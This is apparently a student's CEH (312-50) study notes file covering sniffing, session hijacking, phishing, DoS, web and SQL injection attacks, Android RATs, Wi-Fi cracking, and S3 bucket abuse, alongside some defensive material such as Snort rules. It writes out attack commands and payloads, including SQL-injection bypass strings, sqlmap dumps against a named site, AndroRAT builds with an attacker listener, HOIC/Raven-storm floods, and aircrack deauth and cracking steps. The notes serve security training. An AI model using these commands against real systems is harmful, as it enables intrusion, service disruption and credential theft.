+	2. yersinia -I -> {Press enter} -> F2 -> x -> 1 -> after few seconds -> q -> open wireshark and observe data has been sent to multiple machine discovering for ip 
+
+2.1 Perform password sniffing using wireshark
+	#ettercap -G -> Scan for hosts -> hostslists -> add target 1 & 2 -> MITM Menu -> Arp Poisoning -> ok
+Can also be done through Cain & abel
+
+RARP - Reverese Address Resolution Protol		// defensive 
+
+3.2 Detect ARP Poisoning using XARP and nmap
+
+	Xarp tool
+
+~~~~~~~~~~~~~~~~~~~~	11: Session Hijacking 	~~~~~~~~~~~~~~~~~~~~
+
+Session Hijacking
+	 Hijacking the communication of an authenticated existing user.
+
+Transport Layer Sessions (L4 - TCP sessions) - Sequence ID / Sessions number -> Session ID
+Application Layer Sessions (L7 - HTTP Sessions) - Session ID -> Cookie
+
+HTTP (Hyper Text Transfer Protocol) Stateless Protocol
+
+Stateless Protocol
+=> Cookies	-> temprorary stored medium at the client end, which is created/assinged from the server end
+
+Session ID	// unique ID assinged for an authenticated user to authorize and track his activity.
+
+Broken Authentication or Improper Session Management
+
+Passive	Session Hijacking 	// through sniffing analyzing the traffic - Sniffing
+Active Session Hijacking	// through MITM / Proxy config stealling session 
+
+What is Proxy and How does it work:
+https://www.hackwithbkob.com/2019/09/working-of-network-elements-proxy.html
+https://hackwithbkob.wordpress.com/tag/network-elements/
+
+HTTPS Sniffing:
+A:(VICTIM)Sender	: Windows 7 (Firefox)
+B:Proxy Server 		: Burpsuite(Attacker)
+D:Target website	: Server
+
+Remediation for Proxy:-
+Convince the victim to make attacker machine as proxy and add the certificate as trusted root Authority
+	Convince through call / instructions 
+	By gaining access
+	Creating an addon
+	Through Browser exploitation
+
+Website should enforce // allow data exchange between certain CA
+
+Port forwarding	// WAN,MAN
+
+Labs :-
+
+1.1 Perform Session hijacking using OWASP-ZAP / Burpsuite
+
+1.3 Perform Session hijacking using hetty
+	https://github.com/dstotijn/hetty/releases
+
+Proxy
+1. Run proxy server(Burpsuite) on attacker
+2. Configure proxy settings and add certificate as trusted root authority in victim's browser
+
+Acunetix
+Creds: test-test
+Testing Link:http://test.vulnweb.com/login.php
+Profile Page:http://test.vulnweb.com/userinfo.php
+
+IBM
+testing Link: http://testfire.net/
+Creds: admin-admin
+       jsmith-Demo1234
+
+addon:- Cookie Editor
+https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/  | Cookie Editor
+
+Session Fixation Attack:- Attacker would assign a random / specified value to cookie and the web app accepts.
+
+Session Replay Attack:- Attacker uses an expired cookie / cookie after logout and the web app allows it.
+
+Cookies :-
+Rules of Secure Cookie Management:
+
+Idle time out: if user remains idle for this much time account should get logged out.
+Expiry : when cookie expires.
+
+// Cookie should be expired as soon as the user logs out
+// A cookie assigned to person should not be assinged to any other 
+// A cookie once used should be disposed and not reused again
+// Cookie value should be Random and should not contain any information about user and creds
+// All Cookies should have their attributes (Flags) set.
+
+Flags of Cookie: 
+HTTP only	// cookies are transfered only via http (cannot steal cookies via xss)
+Secure		// cookies are transfered on https.
+
+Similar tool for Session Hijacking: Bettercap
+
+~~~~~~~~~~~~~~~~~~~~	09: Social Engineering ~~~~~~~~~~~~~~~~~~~~
+
+Social Engineering:- 
+	Hacker exploits a human vulnerability like: Greed, Fear & Emotions
+
+Targets:-
+	Organization -> Gain control / Access on the organizational network
+	Individual -> Money, bot(exploited computer) / botnet, Compromise computer
+
+Phases:-
+	Research a target Company
+	Select a Target[Employee] -> IT Admin, Front desk Admin, DevSecOps, CTO, CEO, CFO
+	Develop a relationship
+	Exploit the relationship
+
+Social Engineering Types:-
+	Human Based
+		Impersonation, Vishing, Eavesdropping, Shoulder surfing, Dumpster diving, piggybacking, tailgating, Diversion Theft, Baiting (info for something valuable), Honey Trap, Quid Pro Quo[Tech Support], Elicitation[info through normal chat and friendship]
+	Computer Based
+		Phishing, Spam Email, Scareware, Instant chat messenger, Pop-up window attacks
+	Mobile Based
+		Publishing fake mobile apps, Smishing, Fake Security Applications, Repacking of Legitmate apps
+
+1.1 Sniff cred using SET
+2.1 Detect Phishing using Netcraft
+3.1 Audit Organization's Security for Phishing attacks using OhPhish
+
+1.1 Sniff cred using SET
+	#setoolkit -> y-> 1 -> 2 -> 3 -> 2 -> Enter -> Paste domain -> agree
+	http://attacker-ip/ ex: http://192.168.0.107/
+Similar domains - Testinfire,net
+
+2.1 Detect Phishing using Netcraft
+	Browser -> https://netcraft.com/apps/ -> find out more -> Download -> Add to firefox -> Add -> 
+	Open Certifiedhacker.com [Legitmate] -> sfrclients.ml [Phishing]
+Other Detection mechanisms:-
+	Antivirus Browser Addon
+	Look for Private address / Malicious Domains in Source code of the webpage
+	Verify the domain your accessing
+
+3.1 Audit Organization's Security for Phishing attacks using OhPhish
+	https://portal.ohphish.com/dashboard -> Entice to click -> Fill in the details -> Add users -> Send
+
+Real world examples of Social Engineering - Mr.Robot (1,2) Youtube Talks of Kevin Metnick
+
+~~~~~~~~~~~~~~~~~~~~	10: Denial Of Service 	~~~~~~~~~~~~~~~~~~~~
+
+DOS (Denial Of Service):
+
+	Its an Attack where hacker freezes / makes the target computer inaccessible to the Legitimate user through DOS vulnerability or through flooding with malicious packets
+
+From DOS attack, attacker does not get any data of the target,
+DOS is done to create a financial or reputational Loss for target company.
+
+Connections per instance
+sockets
+
+A server can handle 500 user at given time
+
+there are 1000 request from the client
+
+503 Service Unavailable		
+
+DOS Denial Of Service	// 1 attacker to 1 server
+DDOS Distributed Denial Of Service // Multiple attacker to 1 server
+
+------------------
+
+DOS Working !!!
+
+CPU is a brain a computer.
+
+2.5Ghz
+
+t = 1/f = 1/2.5*10^-9
+
+CPU / Computer is never a multi tasking machine
+Time based multiplexed
+Time switched execution
+
+10 process queue, CPU will be assign 1 sec per process
+
+DOS : Making CPU busy in a single process for longer period. 
+
+Different Types of DOS / DDOS:-
+
+Volume Based Attack:-
+UDP flood attack (High packet rate)
+ICMP flood attack (High packet rate)
+Ping of Death (High Size)
+Smurf Attack (Send Spoofed ICMP to Broadcast network)
+	Attacker IP: 192.168.0.107 	-> ping 192.168.0.255 source ipaddress 192.168.0.106
+	Victim IP: 192.168.0.106 
+Pulse wave and zero day attack
+
+Protocol Based Attack:-
+Syn Flood attack
+
+		Attacker 		Victim		(Permissable Delay of 60 Sec, or Connection would be closed by RST)
+		Syn->
+					<-Syn + Ack			
+		Ack-x>			
+					<-Rst [Waiting for 60 Sec], Reset - restart or protocol
+
+Fragmentation attack	-> breaking into multiple packets
+Spoofed session flood attack (Spoofed tcp packet with multiple SYN, ACK, RST)
+
+		Syn [2045]
+				SYN+Ack [5202]
+		RST [7600]
+
+ACK flood Attack	-> ACK 
+
+Application Layer Attack:-
+
+HTTP GET/POST attack {GET-Time delayed header / POST - Incomplete body}
+Slowloris attack {Sending partial complete http request}
+UDP application layer flood attack
+
+DDOS Extortion attack (Ransomeware DDOS)
+
+1.1 Perform a DOS attack using Raven-storm
+
+	Tool Link:	https://github.com/Tmpertor/Raven-Storm
+Command to download & Intsall raven-storm
+		#> curl -s https://raw.githubusercontent.com/Taguar258/Raven-Storm/master/install.sh | sudo bash -s
+
+	$ sudo rst
+	#rst>> l4
+	#rst>> ip <victim-ip>
+	#rst>> port <target-port>
+	#rst>> threads 20000
+	#rst>> run
+	#rst>> Y
+	#rst>> Cntl + C (Hit more than 2-3)
+
+1.4 Perform a DDOS attack using HOIC
+	Kali / Parrot -> #> service apache2 start
+	ilabs -	CEH tools \ module 10 DOS \ Tools to perform DOS\
+	Install HOIC -> Add Target -> Target_IP -> Increase threads -> Booster -> Generic Boost -> Start
+	Verify in Kali wireshark
+
+2.1 Detect and Protect against DDOS attack using anti DDOS Guardian
+	ilabs -	CEH tools \ module 10 DOS \ DOS protection tools\
+	Install Anti DDOS Guardian -> Block IP -> Observe traffic
+
+Other Tools: DDOS Arrest, DDOS Gaurdian, KF Sensor etc
+
+Some Common ways to Defend Against DOS attacks.
+1. Keep all your machines, patched upto date.
+2. Sensing the traffic & blacklisting
+3. Load Balancer
+4. Content Distributed Network
+5. Black hole routing / Null routing
+
+~~~~~~~~~~~~~~~~~~~~	13: Web Server Hacking 	~~~~~~~~~~~~~~~~~~~~
+
+Web 
+What is Web.
+Basics of HTTP
+
+https://127.0.0.1:8834
+ 
+Web Server Basics: HTTP
+html | php, java, asp, dot net
+webroot, Host Location	// the location of the root directory where the webpages are located
+
+WWW World Wide Web 1989 CERN
+
+https://en.wikipedia.org/wiki/Static_web_page	/ Web 1.0		Before 2000
+https://en.wikipedia.org/wiki/Dynamic_web_page	/ Web 2.0		After 2000 - 2021
+https://en.wikipedia.org/wiki/Web3		/ Web 3.0 		After 2021 // Multiverse
+
+en.wikipedia.org	/wiki/Hypertext_Transfer_Protocol
+
+URL
+
+C:\webroot\www/wiki/Hypertext_Transfer_Protocol	, 
+C:\Inetpub\wiki/Hypertext_Transfer_Protocol
+
+/var/www/wiki/Hypertext_Transfer_Protocol
+
+Apache, nginx, IIS(Microsoft)			Web Servers
+
+Web 1.0(Static) Single Tier Arch | 		// 1989
+Web 2.0(Dynamic) Multi Tier(3tier) Arch		// As of today
+URL
+HTTP Request
+HTTP Response
+
+Unique Resource Locator	/ URL
+
+Unique Resource Indicator
+
+https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol
+
+https:// | en.wikipedia.org | /wiki/ | Hypertext_Transfer_Protocol
+
+https://hackwithbkob.wordpress.com/2019/10/31/batch-file-programming
+
+https:// | hackwithbkob.wordpress.com| /2019/10/31/ batch-file-programming.html
+
+URL = Server Details + URI 
+URI = Path of the file to be interacted with
+
+http://yoursite.com/	folder1/folder2/index.php?Movies=1
+|	Server Details	|~~~ 		URI            ~~~|
+
+URl : http://yoursite.com/folder1/folder2/index.php?userid=1
+
+http:// | yoursite.com | /folder1/folder2/ | index.php | ?userid=1
+
+protocol | your actual website's domain | folders | file which is requested | query 
+
+www.wikipedia.org 	Home Domain
+en.wikipedia.org 	Sub Domain
+
+parameter 
+
+Parameter operators : ?, #, %, 
+
+http request: Request made from the browser to the Web Server.
+HTTP 1.0 = socket is continously connected for all request
+HTTP 1.1 = socket is connection status will be explictly specified for each request, cache control,
+
+{HTTP method} {path of the file / URI } {HTTP version}
+User-Agent: {user & client information}
+Host: {address of the web server}
+{accepted Parameters}
+
+{request body / parameters} //cookie, cookie_name: cookie_value
+
+https://www.tutorialspoint.com/http/http_requests.htm
+
+
+/////
+http response:
+
+{http version} {response code}
+{server info}
+{content info}
+set-cookie: cookie_name:cookie_value, domain: / , expiry: , flags
+connection:
+keep-alive
+closed
+
+Source Code
+
+<html>
+
+</html>
+
+https://www.tutorialspoint.com/http/http_responses.htm
+
+
+httpd.conf		// contains the restrictions of the web server
+
+HTTP Methods	// To indicate the server the type of request been made
+
+GET  => clients wants to get data from the server 		// Response = Header + Body
+HEAD => gets the response header of the requested site.		// Response = Header , Use-Case = Debugging
+POST => clients wants to send data to the server
+
+Static web  = resource is webpage/file
+Dynamic web  = resource is data/content
+
+PUT  => insert / add a resource on the webserver
+PATCH=> edit an existing resource on the webserver
+DELETE=> delete the resource on the webserver
+TRACE=> Echo's back user provided Request
+
+OPTIONS=> used to identify the view all the permiseable HTTP methods
+
+HTTP respones code //To indicate the browser / http client the type of Response been given
+
+1XX 100-199	Information 		100 ok
+2XX 200-299	Successfully processed	200 ok
+3XX 300-399	Redirection		302 unconditional, 301 conditional redirection, 	304 not modified.
+4XX 400-499	Client side Error   	400 bad request, 403 forbidden, 404 not found
+5XX 500-599	Server Side Error	DOS 502/503.
+
+Hacking Webserver:
+CMS Content Management System: wordpress, joomla, drupal, etc
+wp-login.php,	CPanel.
+
+Labs: 
+
+Targets: www.goodshopping.com, testfire.net / demo.testfire.net
+
+1.1 Information Gathering using Ghost Eye
+	https://github.com/BullsEye0/ghost_eye
+
+	#> pip3 install -r requirements
+	#> python3 ghost_eye
+	Enter Your Choice: 3 -> Domain Name for WHOIS lookup	// use real world website
+	Enter Your Choice: 2 -> Domain Name for DNS look up
+	Enter Your Choice: 6 -> Clickjacking test
+
+
+1.5 Footprint a webserver using Netcat & Telnet
+	#> nc -vv {Domain / IP} 80
+		GET / HTTP/1.0 		Enter twice
+
+	#> telnet {Domain / IP} 80
+		GET / HTTP/1.0 		Enter twice
+
+1.6 Enumerate Web Server using Information using NMAP Scripting engine
+	#> nmap -sV --script=http-enum <Domain/IP>
+	#> nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap-  <Domain/IP> 
+	#> nmap --script http-trace -d <Domain/IP>
+	#> nmap -p 80 --script http-waf-detect <Domain/IP> 
+		$wafw00f <Domain/IP>
+
+2.1 Crack FTP credentials using a dictionary attack
+	ilabs target machine : 10.10.0.11
+	
+	# hydra -L <path-of-usernames-wordlist> -P <path-of-passwords-wordlist> ftp://<Domain/IP> -I -t 20
+
+~~~~~~~~~~~~~~~~~~~~	14: Web Application Hacking 	~~~~~~~~~~~~~~~~~~~~
+
+2.1 Perform bruteforce attack using BurpSuite
+
+Web Application Password
+
+1. You neither know the username nor the password More
+
+2. You know the username but don't know the password Less
+
+Target: testfire.net 
+
+Web Passwords Cracking:-
+
+Steps:
+1. Configure Burpsuite with browser
+2. Open target website login page
+3. Generate a dummy request with dummy credentials
+4. Navigate to the login request in burpsuite and send to intruder
+5. remove cookie line if exists
+
+
+6. For Scenario 1(both username and password is unknown): 
+		select the username field first and click add, 
+		select password field second and click add
+
+1) select attack type as cluster bomb
+2) go to payload tab and import the wordlist for both username and password,
+3) verify all the details and click on start attack
+
+7. For Scenario 2(Username is known but password is unknown):
+	select the password field and click add
+
+1) select attack type as sniper
+2) go to payload tab and import the wordlist,
+3) verify all the details and click on start attack
+
+
+	Cracked = Positive	 	Not Cracked= Negative
+1. 		302/301 			200
+2. 		200 				302/301
+3. 	Response length is different		is Same
+4. 	Destination = Profile, Home Page	Same as login page
+
+Username:-
+123456
+qwerty
+Nothing
+Secret
+Jsmith
+Admin
+test
+admin
+
+Password:-
+admin
+12345
+password
+Demo1234
+qwerty123
+12345678
+1234567890
+
+Prevention of Online Password Cracking
+
+1. Rate Limiting
+
+2. Capctha / Token / One time token Cookie:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+CSRF: Client Side request Forgery
+Attacker will make a victim to execute Authenticated web request, with victim's access level, without his knowledge
+1: attacker creates a malicious script
+2: attacker masks the malicious script with some attractive info and sends it to victim
+3: Victim visits the fake web page, and click/submit the link
+
+Labs:-	2.5 Perform CSRF attack
+	Create CSRF Page based on Action / feature of the app and send it to the victim
+	http://lab.awh.zdresearch.com/chapter2/DVWA/ -> admin:password -> 
+
+Remediation:-
+	use MFA for any major tasks
+	Anti CSRF token
+
+2.9 Gain Access using Log4j Vulnerability
+	log4j-Shell-Poc -> along with POC
+ilabs -> ubuntu Machine/log4j-shell-poc
+
+	Own Lab -> Clone repo from github (https://github.com/Hack-with-8k0b/log4j-App-and-Poc) -> Download the POC 
+
+	Install Docker -> apt-get install docker.io -> Run vulnerable server -> Download and extract the poc folder from link in github artcile-> Install dependency -> pip3 install -r requirements.txt ->
+	# tar -xvf jdk.tar.gz
+
+	
+3.1 Detect Web Application Vulnerabilities using N-Stalker Web Application Vulnerability Scanner
+
+	https://www.nstalker.com/free-edition -> Install -> Start -> Domain/IP/URL -> OWASP policy -> Start -> Save & Observer the vulnerabilities
+
+
+~~~~~~~~~~~~~~~~~~~~	15: SQL Injection 	~~~~~~~~~~~~~~~~~~~~					
+
+SQL injection:
+	Bypassing Authentication
+	Stealing Data
+
+File-> Sheets-> Rows x Columns
+
+Database_Name -> Tables -> Columns & Rows
+
+Sample Query:
+
+select * from Table_name where Column1=  " " && Column2=  " "  
+
+sample query for Authentication:
+
+table_name = Users
+Column1 = username	
+Column2 = Password
+
+select * from users where username=  " " AND password=  " "  
+
+Understanding Positive & Negative Scenario
+
+from input fetching
+
+uname = 1"or"1"="1
+pass = 1"or"1"="1
+
+select * from users where username=  "$uname" AND password=  "$pass" 
+
+select * from users where username=  "1" or "1"="1" AND password=  "1" or "1"="1" 
+
+
+Understanding auth bypass using SQL injection payloads
+
+AND == &&
+OR == ||
+
+ceh'or'bkob'='bkob
+1'or'1'='1
+
+uname = 1"or"1"="1
+pass = 1"or"1"="1
+
+select * from users where username=  "$uname" AND password=  "$pass" 
+
+select * from users where username=  "1" or "1"="1" AND password=  "1" or "1"="1"
+ 				( False or True ) AND (False or True)
+					True AND True = True
+
+
+OWASP BWA -> mutillidae -> OWASP 2013 -> A1 Injection -> Bypass Authentication -> Login 
+OWASP BWA -> mutillidae -> OWASP 2013 -> A1 Injection -> Extract Data -> Login
+OWASP BWA -> DVWA -> SQL Injection ->
+--------------------------
+
+Ways to find sql injection vuln
+1. Web Application scanner / Burpsuite scanner (pro)30k
+2. sqlmap	--crawl option
+3. google dorks	gbhacker's link
+
+Types of SQL injection
+
+Error based	we retrive the data through error
+Union based	=>we run an existing query along with the user defined 	query to retrive the data.
+Blind sql	=>each query depends upon the data resulted in previous query
+			//
+	1. boolean based	true or false
+	2. time based		delay or no delay
+
+Sqlmap github link: https://github.com/sqlmapproject/sqlmap
+
+Sqlmap Commands cheatsheet: https://www.hackwithbkob.com/2018/05/sqlmap-cheatsheet.html
+
+http://www.sandex.pk/about.php?id=p
+
+Vulnerable Web Page
+Database Name
+Table_Name
+Column_id
+Dump
+
+
+sqlmap -u <url_of_Website> --crawl=<depth> --dbs	// to scan the website
+
+sqlmap -u <vulnerable_url> --dbs
+sqlmap -u <vulnerable_url> -D <database_name> --tables
+sqlmap -u <vulnerable_url> -D <database_name> -T <tables_name> --columns
+sqlmap -u <vulnerable_url> -D <database_name> -T <tables_name> --dump
+sqlmap -u <vulnerable_url> --current-user
+
+windows => python sqlmap.py <command>
+
+
+~~~~~~~~~~~~~~~~~~~~	17: Hacking Mobile Platforms	~~~~~~~~~~~~~~~~~~~~
+
+Mobile Phone / Smart Phone
+Its a Palm Top Computer,	
+	: Port Scan
+	: Vulnerability Scan (Nessus)
+/\	: Metasploit/Core-Impact
+
+Android ( Open-Source owned by Google) / IOS(Apple)	unix Flavoured OS.
+1.Each App in your phone is actually consider as a specific user
+
+/home/<username>
+Privilege Escalation
+  Android: Rooting
+  IOS: Jail Breaking
+
+Famous RCE : Strandhogg, CVE-2022-20140 (Android 12.0), CVE-2020-0022 an Android 8.0-9.0 Bluetooth Zero-Click
+
+Labs:-
+1.4 Exploit the Android Platform through ADB using PhoneSploit
+	Clone https://github.com/aerosol-can/PhoneSploit -> 
+	#pip3 install colorama
+	# apt-get install adb
+	# python3 phonesploit.py
+	> 3 (Connect to a new phone)
+	> <target IP>
+	> 4 (Access shell)
+	> <target IP>
+	> $ pwd
+	> $ ls
+	> $ cd sdcard
+	> $ ls 
+	> $ cd Download -> Note download file locations
+	> $ exit
+	> 9
+	> <Target IP>
+	> <source file path>
+	> <File destination path>
+	> 14 (List all apps in the phone)
+	> 15 (run apps)
+	> <target ip>
+	> <package name to be started>
+	> 18 (mac and net info)
+	> 21 (Net Stat)
+
+1.5 Hack an android Device by creating APK file using AndroRAT
+	clone -> https://github.com/karma9874/AndroRAT -> 
+	# pip3 install -r requirements ->
+	# python3 androRAT.py --build -i <attacker-ip> -p <attacker-port> -o /var/www/html/filename.apk
+	Share the apk file using apache2 server => 
+	# service apache2 start
+	# python3 androRAT.py --shell -i 0.0.0.0 -p <attacker-port> 		// for starting the listener
+	Share the file to the target and make him install
+	/> help and run commands
+	/> exit
+
+2.1 Analyze a Malicious App using Online Android Analyzers
+	https://sisik.eu/apk-tool -> upload apk file -> 
+
+
+~~~~~~~~~~~~~~~~~~~~	18: IOT & OT Hacking	~~~~~~~~~~~~~~~~~~~~
+
+IOT Hacking:-
+	(Firmware)
+IOT = Electronic Device + Network Capability + Interface(App based / Web app based)
+
+There are no updates
+updates can be tampered
+
+IOT (Internet Of Things)
+Its an ability to connect a particular device to internet
+
+(Heater, Gates, CCTV Camera, Microwave oven, Bulbs, house Controlling, Alexa, Medical Sensor, Pace Makers)
+
+https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project
+
+
+Interface Attacks:-
+	All attack web application
+	Login bruteforce
+	Data dump
+Network Attacks:-
+	Sniffing / MITM
+	Network DOS
+Electronics Attacks:-
+	Dump firmware -> get the secrets 
+	Replay attack
+	Hijacking the OS and make the device your slave
+	Hijack the functionality of a IOT device
+	
+Labs:-
+
+1.1 Gather information using online footprinting tools
+	exploit-db -> GHDB -> Search (SCADA) -> Use ghdb to identify SCADA & iot devices and try to fetch info online
+	shodan.io -> search for port 1883(MQTT) -> 
+		Search for Modbus-enabled ICS /SCADA systems:port:502
+		Search for SCADA systems using PLC name: "Schneider Electric"
+		Search for SCADA systems using geolocations: SCADA Country:"US"
+
+~~~~~~~~~~~~~~~~~~~~	12: Evading Firewall IDS/IPS 	~~~~~~~~~~~~~~~~~~~~
+
+Firewall, HoneyPots, IDS/IPS
+
+A device which block access to malicious / unwanted 
+
+Application Filtering // senses the type of traffic and filters accordingly (WAF)
+
+Packet Filtering    // filtering happend with respect to the content of the packets (Network Firewall)
+
+Circuit Switching  // Decision is made on the sessions of the user
+
+Statefull Inspection // combination of two or more firewall
+
+tool to detect firewall(WAF) is "wafw00f"
+
+Bypass a firewall
+
+1.Proxying 
+2.Encoding 
+
+1'or'1'='1
+
+' is %27
+= is %3a
+
+1%27or%271%27%3a%271
+
+Open Source firewall: Pfsense
+
+-----------------------------
+
+HoneyPots (Counter Intelligence):
+
+Honeypot can be called as rat trap for hackers.
+
+Its dedicated, virtual machine, with vulnerable services running in it to attract hackers and logs there activity.
+
+Labs:- KF Sensor 
+
+------------------------------------------------------------
+
+IDS (Intrusion Detection System) / IPS (Intrusion Prevention System)
+
+IDS : Fire Alarm
+IPS : Fire Extinguisher
+
+IDS (informs when intruder is detected thereby allowing an attack to be happening)
+
+IPS (performs an action allow/block the traffic when an intruder is identified)
+
+NIDS/NIPS (Network Based IDS/IPS)
+HIDS/HIPS (Host Based IDS/IPS)
+
+Bypassing: Encoding
+
+Labs:- Snort
+
+Pre - Req
+	Register and Download snort and its rules
+	Notepad ++
+	winpcap	
+
+	Install Snort -> copy snort.conf from folder to snort installation directory -> Copy so_rules, preproc_rules, rules folders from the zip and paste it onto the snort installation directory -> open cmd in snort\bin ->
+Checking snort installations:-
+
+	cmd> snort -W 		// listing the interfaces
+
+Open snort\etc\snort.conf in notepad++ -> Replace all ipvar -> var ->  line # 45 (Home_Net -> target ip / target network) -> line #104,105,106 define the rules path -> Line #113,114 define rules path -> Line #247 & #250 define the correct processing engines & comment out line # 253 -> line# 511 & 512  verify the whitelist & black list rules -> create 2 empty text files in C:\Snort\rules\ and name them has white_list.rules & black_list.rules-> line # 534 & 535 define the config files -> @ line #536 add text "output alert_fast: alerts.ids:" => inorder to store all logs onto alerts.ids file -> 	
+Note: "config policy_mode:inline_test" should be added at the last of the config file, inorder to run IPS mode on SNort
+
+
+To test config & rule errors => snort.exe -i <device-id> -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii -T
+
+Rules Syntax -> 
+
+<Action> <protocol> <source-addr> <source-port> -> <dest-addr> <dest-port> (msg:"Some message about the rules"; sid:<unique id for the rules>;)
+
+Action => 
+	alert(alert & log) 
+	log(just log) 
+
+	pass(ignore the packet) 
+	drop(block & log) 
+	reject(block, log & send rest) 
+	sdrop(block packet don't log it)
+
+protocol => 
+	icmp, tcp, udp
+
+ex ids mode: alert icmp any any -> <target-ip> any (msg:"System is been pinged!!!"; sid:1234567890;)
+
+To run in IDS mode => snort.exe -i <device-id> -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
+
+ex ips mode: drop icmp any any -> <target-ip> any (msg:"System is been pinged!!!"; sid:1234567890;)
+
+To run in IPS mode => snort.exe -i <device-id> --enable-inline-test -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
+
+~~~~~~~~~~~~~~~~~~~~	16: Wireless Hacking 	~~~~~~~~~~~~~~~~~~~~
+
+Wifi (Wireless Fedility) IEEE 802.11
+Wifi Access point, Wifi Router,  almost similar to switch 
+
+2.4Ghz(low-Range, personal, small scale office) 
+5 Ghz(high-range, high scale wifi connection, Ex: google wire)
+
+Version: 	a,b,g,n(Ranges, speed)
+BSSID	: Mac address wifi AP
+ESSID	: Wifi Name
+Channels: 14 total 11 allowed in indian Region
+Password Enc: Open, WEP, WPA, WPA2
+WEP = Wired Equivalent Privacy (encoded) 2007year 25k decode the password	
+WPA/WPA2 = Wifi Protected Access(hashed).
+
+Modem + Router + 4 port Switch + Access point
+
+Wifi Works:-
+1. Access Point would broadcast his info to his feasible range
+2. When client enters access points feasible range then he would get AP's information
+3. Client would iniate connection to the AP along with the creds in the specified method shared in Broadcasted info
+4. AP would validate the creds, and give access to client if creds are correct.
+
+Monitor Mode: Mode in your Wifi adapter, which will provide you an access to sniff on the wireless frequency 
+
+FM radio Broadcasting Station = Wifi Access point
+
+FM receiver = Wifi adapter
+
+Step to Hack wifi
+
+1. Turn your wifi adapter into Monitor Mode.
+//athreos chipset	Ex; TPlink 722nv1, 822n v2, Alpha
+
+2. search the nearby wifi signals
+
+3. select one of your target, and start sniffing on the targets channel and saving the received data into a file.
+
+WEP: 4. after collecting 25k packets, crack the password
+
+WPA/WPA2: 4. wait until you receive password handshake.
+
+5. use bruteforce or dictionary to crack the wifi password.
+
+6. Turn your wifi adapter back to Managed Mode.
+
+
+Managed Mode : Used to connect to wifi access point
+Monitor Mode : ablity To sniff wireless packets, to broadcast spoofed packets
+
+Dependencies : External wifi adapter, with Atheros chipset
+	     : interms of WPA need a dictionary file
+	     : Require atleast 1 client connected to the wifi AP
+             : Kali linux should be running as a host OS, Live OS
+
+=> iwconfig 		// to check the status of wireless adapter
+=> airmon-ng start <device-name>	// turn on moniter mode
+=> airodump-ng <device-name>		// to get info of nearby wifi AP's
+=> airodump-ng --bssid <mac addr of wifi AP> -c <channel number> --write <filename to be written as> <device name>	//to sniff and save the sniffed file
+=> aireply-ng -0 <number of packets> -a <bssid> -c <clients mac address> <device name>	// to disconnect the client from target AP
+
+=> aircrack <sniffed file>-01.cap	// to crack WEP password
+=> aircrack -w <wordlists path> <sniffed file>-01.cap	// to crack wpa or wpa2 password
+=> airmon-ng stop <device-name>	// turn off moniter mode
+
+
+~~~~~~~~~~~~~~~~~~~~	19: Cloud Computing	~~~~~~~~~~~~~~~~~~~~
+
+IAAS Infrastructure As Service
+	Infra is given as service os installation, libraries, and other components need to be taken care by client
+
+=>You want to build a complete network on cloud
+
+PAAS Platform As Service
+	Platform (language specific support) and libraries will be given, configuration and data need to be taken care by client
+
+=> You want to host a website
+
+SAAS Software As Service
+	End user software will be given only data need to be taken care by client. Ex: google sheets.
+
+=> When you want to perform any specific operation
+
+Security Concerns:
+	IAM Policy
+	Integration of Various Entities
+	Disaster Recovery(Data should always be in atleast two different datacenters located geographicaly)
+	DB Key Rotations
+	Continours Tracking of Bill and activity
+	DARE: Data At Rest Encryption(key) 
+
+(CCSP) Amazon Web Services, Azure, Google Cloud Platform, Alibaba
+Cloud Based Vulnerability Scanner: Cloud Checker, Divycloud from Rapid7, Scout Suite(Open Source) 
+
+Labs:-
+1.2 Enumerate S3 buckets using S3 Scanner:- https://github.com/GermanAizek/S3-Bucket-Scanner
+	# pip install -r requirements.txt
+		Open sites.txt and add your bucket list (eccouncil, certifiedhacker, certifiedhacker1)
+	# python s3scanner.py sites.txt
+
+Create an account in AWS -> IAM -> Users -> Add Users -> <Username> -> type:Programmitc Access -> Next -> Next -> Next -> Create User
+
+$ aws configure
+	Paste Access key
+	Paste Secrest Access Key
+	eu-west-1
+
+Now run the command again
+
+2.1 Exploit open S3 Buckets using AWS CLI
+	Create AWS account and configure account into aws cli with region= eu-west-1
+	#aws s3 ls s3://certifiedhacker1
+	#aws s3 mv hack.txt s3://certifiedhacker1
+	#aws s3 cp s3://certifiedhacker1/hack.txt .	
+	#aws s3 rm s3://certifiedhacker1/hack.txt 
+
+ 
+~~~~~~~~~~~~~~~~~~~~	20: Cryptography	~~~~~~~~~~~~~~~~~~~~
+
+Encryption:-
+Sender:
+Plain text + Algorithm = Cipher text(encrypted)
+
+Transfer
+
+Decryption:-
+Receiver:
+Cipher text(encrypted) - Algorithm = Plain text
+
+Symmetric	key used is same for encryption and decryption
+
+		speed is more, security is less when communicating with new person
+
+DES,AES majorly used in wifi password exchange
+
+Asymmetric	key used is different for encryption and decryption
+
+RSA, 
+	Public Key: Key is visible to all , Ex: Email / Phone number
+	Private Key: key is visible only to the user, Ex: Password
+
+note: data encrypted with public key, can only be decrypted by its private key, and vice versa
+		speed is less, security is more
+
+Hybrid 	
+
+combines both advantage of symmetric and asymmetric, and eliminates the dis advantages b/w them.
+SSH, https, VPN, RDP
+
+Encryption, Encoding & Hashes
+
+Encoding = which can be decoded publicly by any one who knows the algorithm, 
+EX: base64, HEX, ascii, rot13
+
+Encryption = Which can be decrypted by only the person who has the key
+EX;AES,DES, RSA etc
+
+Hashing = is a one way algorithm which cannot be reversed EX: md5, sha1
+
+https://en.wikipedia.org/wiki/Secure_Hash_Algorithms
+
+md5sum <filename>, sha256sum <filename>
+///
+hash: converts the plain text data into a unique text 
+md5,sha256,sha512
+hello 
+
+1. for a unique file/text a unique string of text is generated no matter what ever computer, location is to used to generate the hash.
+2. Hashes are always irreversible
+
+Hashcalc -> For calculating hash
+Cryptoforge -> for Encrypting files
+Veracrypt / Bitlocker -> Disc Encryption
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Exam Code:- 312-50
